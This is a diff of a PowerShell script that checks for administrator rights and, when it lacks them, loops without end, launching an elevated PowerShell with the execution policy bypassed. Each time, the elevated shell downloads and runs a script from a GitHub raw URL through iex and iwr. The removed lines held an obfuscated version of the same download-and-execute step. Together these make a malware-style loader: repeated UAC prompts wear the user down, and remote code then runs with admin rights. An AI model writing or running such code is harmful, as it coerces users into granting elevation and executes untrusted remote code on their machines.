@@ -9,20 +9,15 @@ try {
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 # ===== ELEVATION LOOP =====
+$self = "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1"
+
 if (-not $isAdmin) {
-    if ($PSCommandPath) {
-        $arg = "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
-    } else {
-        $self = "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1"
-        $arg = "-ExecutionPolicy Bypass -c &('I'+'EX')((New-Object('Ne'+'t.WebClient')).'Dow'+'nloadString'('$self'))"
-    }
     while ($true) {
         try {
-            Start-Process powershell -Verb RunAs -ArgumentList $arg -ErrorAction Stop
-            break
-        } catch {
-            Start-Sleep -Seconds 2
-        }
+            $proc = Start-Process powershell -Verb RunAs -PassThru -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command iex((iwr '$self' -UseBasicParsing).Content)" -ErrorAction Stop
+            if ($proc) { break }
+        } catch {}
+        Start-Sleep -Seconds 2
     }
     exit
 }
